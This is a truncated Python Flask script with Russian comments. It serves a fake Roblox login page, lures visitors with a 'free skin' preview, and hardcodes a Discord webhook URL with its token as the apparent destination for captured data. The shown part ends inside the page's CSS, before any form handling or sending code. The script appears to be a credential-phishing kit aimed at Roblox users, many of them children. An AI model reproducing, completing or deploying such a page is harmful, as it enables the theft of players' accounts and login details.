from flask import Flask, request, redirect
import requests
import os

app = Flask(__name__)

# Твой вебхук вшит напрямую, но если хочешь — можно через переменную окружения
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://ptb.discord.com/api/webhooks/1527631838250668112/2aRhOMk0ukMaGct_pXrS-EWLX5gkvMuKFK1HZmX8J3G1QYTFt1YRBZeJtYsCjoSrWfZ2')

@app.route('/')
def index():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta property="og:image" content="https://cdn.discordapp.com/attachments/123456789/987654321/roblox_skin.png">
        <meta property="og:title" content="🔥 Скин выпал! Забирай">
        <meta property="og:description" content="Только для избранных">
        <title>Вход в Roblox</title>
        <style>
            body { font-family: Arial, sans-serif; background: #1a1a2e; color: white; text-align: center; padding-top: 50px; }
            input { padding: 12px; margin: 8px; width: 260px; border-radius: 8px; border: 1px solid #444; background: #222; color: white; }
            button { padding: 12px 40px; background: #00bfff; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; }
            button:hover { background: #0099cc; }
            .box { background: #16213e; padding: 30px; border-radius: 16px; display: inline-block; }
